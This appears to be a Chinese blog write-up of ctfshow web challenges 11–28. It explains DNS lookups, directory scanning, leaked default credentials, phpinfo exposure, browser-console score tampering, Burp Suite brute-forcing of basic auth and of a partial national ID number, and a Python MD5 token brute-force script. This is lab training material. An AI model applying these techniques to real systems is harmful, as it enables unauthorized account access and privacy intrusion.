+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nslookup baidu.com</span><br><span class="line">Server:		10.123.119.98</span><br><span class="line">Address:	10.123.119.98<span class="comment">#53</span></span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:	baidu.com</span><br><span class="line">Address: 39.156.69.79</span><br><span class="line">Name:	baidu.com</span><br><span class="line">Address: 220.181.38.148</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>（2）在交互模式下正向解析，查询域名信息</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nslookup</span><br><span class="line">&gt; baidu.com</span><br><span class="line">Server:		<span class="number">10.123</span>.<span class="number">119.98</span></span><br><span class="line">Address:	<span class="number">10.123</span>.<span class="number">119.98</span><span class="comment">#53</span></span><br><span class="line"></span><br><span class="line">Non<span class="literal">-authoritative</span> answer:</span><br><span class="line">Name:	baidu.com</span><br><span class="line">Address: <span class="number">220.181</span>.<span class="number">38.148</span></span><br><span class="line">Name:	baidu.com</span><br><span class="line">Address: <span class="number">39.156</span>.<span class="number">69.79</span></span><br><span class="line">&gt; <span class="keyword">exit</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最后一个交互命令 exit 表示退出</p>
+<p>（3）反向解析，通过 IP 查询对应的域名。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nslookup <span class="number">209.132</span>.<span class="number">183.105</span></span><br><span class="line">Server:		<span class="number">10.123</span>.<span class="number">119.98</span></span><br><span class="line">Address:	<span class="number">10.123</span>.<span class="number">119.98</span><span class="comment">#53</span></span><br><span class="line"></span><br><span class="line">Non<span class="literal">-authoritative</span> answer:</span><br><span class="line"><span class="number">105.183</span>.<span class="number">132.209</span>.in<span class="literal">-addr</span>.arpa	name = redirect.redhat.com.</span><br><span class="line"></span><br><span class="line">Authoritative answers can be found from:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>（4）查询域名别名。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nslookup <span class="literal">-query</span>=cname www.baidu.com</span><br><span class="line">Server:		<span class="number">10.123</span>.<span class="number">119.98</span></span><br><span class="line">Address:	<span class="number">10.123</span>.<span class="number">119.98</span><span class="comment">#53</span></span><br><span class="line"></span><br><span class="line">Non<span class="literal">-authoritative</span> answer:</span><br><span class="line">www.baidu.com	canonical name = www.a.shifen.com.</span><br><span class="line"></span><br><span class="line">Authoritative answers can be found from:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>（5）查询其他类型的记录。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nslookup <span class="literal">-query</span>=<span class="built_in">TYPE</span> DOMAIN|IP [<span class="type">DNS</span>-<span class="type">SERVER</span>]</span><br><span class="line"><span class="built_in">TYPE</span>:</span><br><span class="line">	A		IPv4 地址记录</span><br><span class="line">    AAAA	IPv6 地址记录  </span><br><span class="line">	AFSDB 	Andrew文件系统数据库服务器记录 </span><br><span class="line">	ATMA 	ATM地址记录 </span><br><span class="line">	CNAME	别名记录 </span><br><span class="line">	HINFO	硬件配置记录，包括CPU、操作系统信息 </span><br><span class="line">	ISDN	域名对应的ISDN号码 </span><br><span class="line">	MB		存放指定邮箱的服务器 </span><br><span class="line">	MG		邮件组记录 </span><br><span class="line">	MINFO	邮件组和邮箱的信息记录 </span><br><span class="line">	MR		改名的邮箱记录 </span><br><span class="line">	MX		邮件服务器记录 </span><br><span class="line">	NS		名字服务器记录 </span><br><span class="line">	PTR		反向记录 </span><br><span class="line">	<span class="built_in">RP</span>		负责人记录 </span><br><span class="line">	RT		路由穿透记录 </span><br><span class="line">	SRV		TCP服务器信息记录 </span><br><span class="line">	TXT		域名对应的文本信息 </span><br><span class="line">	X25		域名对应的X.<span class="number">25</span>地址记录</span><br><span class="line"></span><br><span class="line">例：nslookup <span class="literal">-type</span>=A qq.com    </span><br></pre></td></tr></table></figure>
+
+<p>（6）查询所有记录。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@xg:~<span class="comment"># nslookup -query=any qq.com</span></span><br><span class="line">Server:         <span class="number">114.114</span>.<span class="number">114.114</span></span><br><span class="line">Address:        <span class="number">114.114</span>.<span class="number">114.114</span><span class="comment">#53</span></span><br><span class="line"> </span><br><span class="line">Non<span class="literal">-authoritative</span> answer:</span><br><span class="line">qq.com  mail exchanger = <span class="number">10</span> mx3.qq.com.</span><br><span class="line">qq.com  mail exchanger = <span class="number">20</span> mx2.qq.com.</span><br><span class="line">qq.com  mail exchanger = <span class="number">30</span> mx1.qq.com.</span><br><span class="line">Name:   qq.com</span><br><span class="line">Address: <span class="number">183.3</span>.<span class="number">226.35</span></span><br><span class="line">Name:   qq.com</span><br><span class="line">Address: <span class="number">123.151</span>.<span class="number">137.18</span></span><br><span class="line">Name:   qq.com</span><br><span class="line">Address: <span class="number">61.129</span>.<span class="number">7.47</span></span><br><span class="line">qq.com  nameserver = ns2.qq.com.</span><br><span class="line">qq.com  nameserver = ns4.qq.com.</span><br><span class="line">qq.com  nameserver = ns1.qq.com.</span><br><span class="line">qq.com  nameserver = ns3.qq.com.</span><br><span class="line"> </span><br><span class="line">Authoritative answers can be found from:</span><br></pre></td></tr></table></figure>
+
+<p>本题就是通过命令</p>
+<p><strong>nslookup -query&#x3D;any flag.ctfshow.com</strong>成功查询的信息</p>
+</li>
+</ul>
+<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>打开题目，发现是一个类似于购物平台的界面，尝试着点击一下各个可能可以点击的东西，发现并没有什么作用</p>
+<p>于是使用dirsearch先扫描一下网页</p>
+<p>发现存在robots.txt的隐藏界面，于是将&#x2F;.robots.txt加到网址后</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231025002409603.png" alt="image-20231025002409603"></p>
+<p>得到信息发现存在一个登陆页面p</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231025002652178.png" alt="image-20231025002652178"></p>
+<p>在网页后缀加上提示的&#x2F;admin&#x2F;，进入登陆页面，用户名默认为admin</p>
+<p>看到打开本题时，提示信息说“有时候网站上的公开信息，就是管理员常用密码”</p>
+<p>于是就想到去原始页面去找密码信息，果然，在最下面找到一串数字，发现</p>
+<p>chan</p>
+<p>尝试将这一串数字当成密码输入，果然答案正确，得到flag</p>
+<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>打开题目，发现页面是一个像是一个购买产品的页面</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231025225042344.png" alt="image-20231025225042344"></p>
+<p>发现页面有很多可以点击的按钮，于是试着点着看看，发现点击后都没什么用，使用dirsearch插件扫描一下，也没扫出什么东西，实在没办法，只能看了本题的wp</p>
+<p>wp中提示这个页面中最下面有一个<strong>document</strong>可以点击，于是点击进去发现一个新的页面</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231025225726882.png" alt="image-20231025225726882"></p>
+<p>该页面提示还存在一个默认的后台地址</p>
+<p>尝试着登陆一下这个后台地址，其中url中的“<strong>your-domain</strong>”指的就是本题的域名地址</p>
+<p>并且从这个后台地址找到了使用dirsearch工具扫不出来隐藏网页的原因，原来是这个登陆页面存在一个“system1103”的前缀，而dirsearch字典并不包含这个前缀，导致扫不出来</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231025230145587.png" alt="image-20231025230145587"></p>
+<p>想到本题的提示“技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码”</p>
+<p>于是猜到这道题的密码就是打开的那个pdf中写的密码，输入用户名与密码，成功得到flag</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231025230338881.png" alt="image-20231025230338881"></p>
+<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>打开题目，发现还是一个类似软件下载的页面</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231025233957431.png" alt="image-20231025233957431"></p>
+<p>尝试着点击一下各个可点击的按键，发现并不能找到什么信息，没有办法，只能看看wp找找思路。</p>
+<p>wp中提示，还有本题原本的提示，说到”<strong>不经意泄露editor的信息</strong>“，并且拿dirsearch扫描找到&#x2F;editor&#x2F;路径可以访问</p>
+<p>同时在源码中也找到了一个看似可以访问的editor路径</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231025235101975.png" alt="image-20231025235101975"></p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231025234633009.png" alt="image-20231025234633009"></p>
+<p>于是在url后缀加上&#x2F;editor&#x2F;</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231025234836222.png" alt="image-20231025234836222"></p>
+<p>是一个文件上传的功能页面，于是尝试着从用这个编译器页面寻找突破口</p>
+<p>找到了文件上传的功能，在这个var&#x2F;www&#x2F;html&#x2F;路径下找到了一个nothinghere中找到一个fl000g.txt的文件路径</p>
+<p>通过在url中访问其相对路径**&#x2F;nothinghere&#x2F;fl000g.txt**</p>
+<p>成功得到flag</p>
+<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>打开题目，发现是一个不知道是什么内容的网页</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231026002719036.png" alt="image-20231026002719036"></p>
+<p>没有思路，先用dirsearch扫描一下</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231026002816056.png" alt="image-20231026002816056"></p>
+<p>发现有可登录的后台界面**&#x2F;admin&#x2F;**</p>
+<p>在url后加后缀，进入登陆界面</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231026003010979.png" alt="image-20231026003010979"></p>
+<p>尝试用户名使用admin，密码尝试一下题目刚开始提示的邮箱，发现显示密码错误，想到这里还有一个忘记密码的选项，点击忘记密码，发现要填入所在地的城市才能改密码</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231026003432754.png" alt="image-20231026003432754"></p>
+<p>想到题目提示”公开的信息比如邮箱，可能造成信息泄露，产生严重后果“，猜测本题有可能是个类似社工的题目，想到那个qq邮箱可能可以找到地址所在地，在qq里查找，发现是西安的</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231026003929466.png" alt="image-20231026003929466"></p>
+<p>成功重置密码，输入账户密码，成功得到flag</p>
+<h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><p>打开题目，发现是一个元素周期表的3D图，并且页面没有一点信息</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231026005751829.png" alt="image-20231026005751829"></p>
+<p>于是使用御剑软件扫描网页，成功扫描到了有隐藏目录<strong>tz.php</strong></p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231026005925941.png" alt="image-20231026005925941"></p>
+<p>于是在url后加<strong>tz.php</strong>，进入到雅黑php探针</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231026010100692.png" alt="image-20231026010100692"></p>
+<p>并且在其中的php信息，还有括号内容为（phpinfo），得知这是有着内部信息的网页</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231026010251590.png" alt="image-20231026010251590"></p>
+<p>点击进入phpinfo网页，直接ctrl+f查找ctfshow，直接找到flag</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231026010422426.png" alt="image-20231026010422426"></p>
+<p>成功解出题目</p>
+<p>写完该题后还查找了一些关于php探针的知识</p>
+<p>php是什么：</p>
+<ul>
+<li>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。</li>
+</ul>
+<p>php探针的功能：</p>
+<ul>
+<li>1、服务器环境探测：CPU、在线时间、内存使用状况、系统平均负载探测（支持LINUX、FreeBSD系统，需系统支持），操作系统、服务器域名、IP地址、解释引擎等 ；<br>2、PHP基本特征探测：版本、运行方式、安全模式及常规参数；<br>3、PHP组件支持探测：MYSQL、GD、XML、SESSION、SOCKET等组件支持情况 ；<br>4、服务器性能检测：整数运算能力、浮点数运算能力、数据IO能力；<br>5、自定义探测：MYSQL连接测试、MAIL发信测试、函数支持情况及PHP配置参数。</li>
+</ul>
+<p>常见的php探针文件名：<strong>tz.php</strong></p>
+<h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p>打开题目，发现其中没有什么信息</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231026234325567.png" alt="image-20231026234325567"></p>
+<p>尝试着在url后面添加这个image的路径后缀，添加完查看发现只是几张图片，并没有什么有用的信息，于是尝试用御剑扫描一下，并没有扫描出来，再使用dirsearch扫描，成功发现存在隐藏文件**&#x2F;backup.sql**</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231026234558390.png" alt="image-20231026234558390"></p>
+<p>再网站后面添加**&#x2F;backup.sql**，自动下载了文件，并且在文件里成功得到flag</p>
+<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p>打开题目，发现是一个像素鸟的得分游戏</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231027141533196.png" alt="image-20231027141533196"></p>
+<p>并且在最开始，题目提示该题要得到101分才能得到flag，尝试着玩了一下，发现通过玩游戏得到flag的方式几乎是不可能的，于是想到F12查看一下源码</p>
+<p>发现有个变量为score，还想到该题就是要得分超过101分才能得到flag，所以觉得这个值应该有用</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231027144035166.png" alt="image-20231027144035166"></p>
+<p>除此之外，还发现了需要game_over值为false，于是在控制台对score与game_over赋值，并且最后运行该程序，成功得到新的提示</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231027144542961.png" alt="image-20231027144542961"></p>
+<p>提示去110.php看看，于是在url后加上110.php，成功得到flag</p>
+<p>除了这个方法以外，通过看b站上ctfshow的视频讲解，发现还有一种方法</p>
+<p>该方法在源码中发现</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231027144834117.png" alt="image-20231027144834117"></p>
+<p>这是一串关于对score是否大于一百的条件分析，若大于一百，则会弹出一个确认框，而想到大于100刚好是得到flag的条件，于是猜测下面那一个确认框就是获得flag的信息</p>
+<p>而说括号内的内容是<strong>unicode</strong>，但是不知道具体的信息，视频中说<strong>Unicode</strong>最好的解码方式就是在控制台运行</p>
+<p>具体操作方式是直接在操作台输入<strong>alert（“\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b”）</strong>，把他作为字符串进行输出</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231027145657126.png" alt="image-20231027145657126"></p>
+<p>同样也出现提示，可以通过这个提示得到flag</p>
+<h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><p>打开题目，发现是一个登陆界面，先尝试着登陆一下，用户名为admin，密码为1234试一下弱口令，显示用户名密码错误，于是查看一下网页源码</p>
+<p>发现可以看见用户名与密码的值</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231027152911411.png" alt="image-20231027152911411"></p>
+<p>并且从前面的内容发现是一个AES加密</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231027152810001.png" alt="image-20231027152810001"></p>
+<p>可以直接使用火狐的hackbar,将用户名与密码的值直接post上去</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231031234301996.png" alt="image-20231031234301996"></p>
+<p>其中用户名名字为username，密码名字为pazzword</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231031234446495.png" alt="image-20231031234446495"></p>
+<p>其中在源代码中给出了username和pazzword的值</p>
+<p>直接在hackbar上把用户名和密码post上去，成功得到flag</p>
+<p>post的格式如下<img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231031234749191.png" alt="image-20231031234749191"></p>
+<h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p>打开题目，发现所给的提示并看不懂，于是先尝试用dirsearch扫描一下</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231101000332225.png" alt="image-20231101000332225"></p>
+<p>发现扫描出了一个301跳转的后缀网址，于是继续扫这个有后缀的网址</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231101000438845.png" alt="image-20231101000438845"></p>
+<p>直接进入这个后缀的网址下。获得一个下载的文件，记事本打开直接ctrl+f查找flag，并成功得到</p>
+<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p>因为本题是一个爆破类型的题，并且在打开页面发现是一个基础认证，先随便输入一个用户名密码，然后使用bp抓包，发现抓包信息多出了一行</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231102002641135.png" alt="image-20231102002641135"></p>
+<p>看得出来这个是一个base64的密码，到base64在线解码器中解码一下，发现内容就是刚刚输入的用户名与密码，于是开始准备进行爆破</p>
+<p>先发送到测试器，并且对其进行配置</p>
+<p>首先确定爆破的位置</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231102003230531.png" alt="image-20231102003230531"></p>
+<p>并且将题目所给的可以爆破的字典配置上去</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231102003342969.png" alt="image-20231102003342969"></p>
+<p>再加一个**admin:**的前缀，以及base64的编码选项</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231102003452988.png" alt="image-20231102003452988"></p>
+<p>还不能忘记取消url编码选项，因为url编码内容有“&#x3D;”，而base64刚好又有“&#x3D;”，所以取消这个选项</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231102003635694.png" alt="image-20231102003635694"></p>
+<p>然后还可以在选项这个界面将线程数与下面两个选项改一下，加快爆破的速度</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231102003735802.png" alt="image-20231102003735802"></p>
+<p>配置完成后就可以直接开始爆破，最后成功看到一个返回值为200的选项，这个肯定就是成功爆破的结果，直接看响应，就可以成功获得flag了</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231102004029056.png" alt="image-20231102004029056"></p>
+<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><p>打开本题，发现页面内容是一段php代码</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231103201447442.png" alt="image-20231103201447442"></p>
+<p>还是不太懂php语言，于是结合chatgpt理解一下这段代码的意思</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231103201821427.png" alt="image-20231103201821427"></p>
+<p>这个代码意思是检查是否有通过GET请求传参的行为，如果有的话，将从GET传参中获取token参数的值，并将其进行MD5哈希处理，将结果储存在$token变量中然后在语句</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123; </span><br></pre></td></tr></table></figure>
+
+<p>中检查 <code>$token</code> 字符串的第2、15和18个字符是否相等。如果它们相等，那么接下来的代码块将会执行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123; ... &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个条件语句进行了一些数值计算。它首先将 <code>$token</code> 字符串的第2、15和18个字符转换成整数，然后将它们相加，并除以第2个字符的整数值。结果会与第32个字符的整数值进行比较，如果相等，那么接下来的代码块将会执行。</p>
+<p><code>echo $flag;</code>：如果前面的条件都满足，那么它将打印出 <code>$flag</code> 的值。前提是在代码的其他地方有定义了 <code>$flag</code> 变量。</p>
+<p>由此可知，当获得了正确的token值，并将其使用GET方式传参上去，就可以得到该题的flag</p>
+<p>这里因为不会写脚本，只能在wp中抄了一个其他大佬写的脚本，内容如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_token</span>():</span><br><span class="line">    <span class="comment"># 生成各种可能的token值并验证条件</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        key=<span class="built_in">str</span>(i).encode()</span><br><span class="line">        token = hashlib.md5(key).hexdigest()</span><br><span class="line">        <span class="built_in">print</span>(token)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> (token[<span class="number">1</span>] == token[<span class="number">14</span>] == token[<span class="number">17</span>] <span class="keyword">and</span> (<span class="built_in">int</span>(token[<span class="number">1</span>]) + <span class="built_in">int</span>(token[<span class="number">14</span>]) + <span class="built_in">int</span>(token[<span class="number">17</span>])) / <span class="built_in">int</span>(token[<span class="number">1</span>]) == <span class="built_in">int</span>(token[<span class="number">31</span>])):</span><br><span class="line">                <span class="keyword">return</span> token,key</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成满足条件的token</span></span><br><span class="line">result = generate_token()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> result:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;满足条件的token:&quot;</span>, result[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;满足条件的key:&quot;</span>, result[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;没有找到满足条件的token&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>运行成功得到token</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231103202538283.png" alt="image-20231103202538283"></p>
+<p>将token值GET上去，成功得到flag</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231103202632682.png" alt="image-20231103202632682"></p>
+<p>在此提示，<strong>GET传参的方法</strong>，是在网址后输入**?x&#x3D;（）**其中括号内的内容为你要输入的值，如上图url后面所示</p>
+<h2 id="web-24"><a href="#web-24" class="headerlink" title="web 24"></a>web 24</h2><p>打开题目发现是一个这样的界面</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203171644092.png" alt="image-20231203171644092"></p>
+<p>这段php代码的意思是，检查是否有通过get请求输入的’r‘值，如果 ‘r’ 已设置，它会获取其值并将其存储在变量 <code>$r</code> 中。</p>
+<p>再用这行语句实现随机数生成<strong>mt_srand(372619038)</strong></p>
+<p>因为这个<strong>mt_srand</strong>函数里面有一个特定的数字，所以这是一个伪随机数，即每次在372619038为前提的mt_srand函数都会生成特定的值</p>
+<p>于是试图用一个php代码获得生成的数</p>
+<p>在这里，我使用了<strong>phpstudy</strong>这个软件来配置php环境，这里附上一篇用phpstudy运行php代码的教程：<a href="https://blog.csdn.net/wangyuxiang946/article/details/128732133?ops_request_misc=%7B%22request_id%22:%22170158843816800213062530%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=170158843816800213062530&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-128732133-null-null.142%5Ev96%5Epc_search_result_base7&utm_term=phpstudy&spm=1018.2226.3001.4187">PhpStudy下载安装使用教程，图文教程（超详细）_phpstudy安装_士别三日wyx的博客-CSDN博客</a></p>
+<p>以下是配置好之后具体运行php代码的过程：</p>
+<p>先用在vscode写好要运行的php代码，接着把这个文件复制到这个地方</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203172611125.png" alt="image-20231203172611125"></p>
+<p>也就是在<strong>phpstudy_pro下的WWW路径下</strong></p>
+<p>接着在浏览器打开localhost，即如下网站</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203172750066.png" alt="image-20231203172750066"></p>
+<p>接着，只需要在网站的后缀加上创建好的php文件的名称，如下，即可得到该php文件运行的结果</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203172922964.png" alt="image-20231203172922964"></p>
+<p>这便是在那个特定数下生成的伪随机数，将这个数通过get方式传参进入题目网站，成功得到flag</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203173037956.png" alt="image-20231203173037956"></p>
+<h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><p>打开该题发现是一个获取各种信息的界面，于是尝试用bp抓包</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203174656011.png" alt="image-20231203174656011"></p>
+<p>不用输入值，直接使用bp抓包，并且把信息发送给重发器，在重发器再进行一次发送，即可获取flag</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203174910517.png" alt="image-20231203174910517"></p>
+<h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2><p>打开题目，发现是一个登陆界面</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203214540510.png" alt="image-20231203214540510"></p>
+<p>其中发现有两个可以点击出来的选项，分别是录取名单和学生学籍信息查询系统，点击看看有什么信息，其中录取名单中是学生的身份证号与姓名，但是身份证信息并不全，而学生学籍信息查询那里发现也是一个登陆界面，其中登陆需要信息分别为姓名与身份证号，如图</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203214937326.png" alt="image-20231203214937326"></p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203215000206.png" alt="image-20231203215000206"></p>
+<p>于是想到要爆破身份证号码，于是使用bp爆破</p>
+<p>先使用高先伊的姓名与身份证进行爆破</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203215143592.png" alt="image-20231203215143592"></p>
+<p>对中间未知的部分进行爆破，因为这一部分属于生日，于是将其设为1990到2021年的年份进行爆破，如图配置有效载荷</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203215314443.png" alt="image-20231203215314443"></p>
+<p>成功爆破得出结果</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203215421944.png" alt="image-20231203215421944"></p>
+<p>发现生日为19900201，于是得到完整的身份证号</p>
+<p>将身份证号与姓名输入，便成功得到了学号与密码的信息</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203215547537.png" alt="image-20231203215547537"></p>
+<p>其中，要得到信息也可以直接查看爆破后的响应</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203215631539.png" alt="image-20231203215631539"></p>
+<p>发现是一串unicode码，直接在控制台输入console.log(“\u606d\u559c\u60a8\uff0c\u60a8\u5df2\u88ab\u6211\u6821\u5f55\u53d6\uff0c\u4f60\u7684\u5b66\u53f7\u4e3a02015237 \u521d\u59cb\u5bc6\u7801\u4e3a\u8eab\u4efd\u8bc1\u53f7\u7801”),一样可以得到响应信息，获取学号与密码信息</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203215908055.png" alt="image-20231203215908055"></p>
+<p>于是将获得的学号与身份证登陆总界面，即可获取flag</p>
+<h2 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h2><p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203222124424.png" alt="image-20231203222124424"></p>
+<p>本题打开是什么信息都没有，于是直接用bp爆破一下</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203222217133.png" alt="image-20231203222217133"></p>
+<p>爆破之后，发现网站后缀是2.txt，因为打开的是靶场环境，而靶场环境是一直变化的，而.txt又是一个固定文件，于是将其2.txt删除，改成直接访问他的默认文件index.php，并且在前面的&#x2F;0与&#x2F;1改为爆破的目标</p>
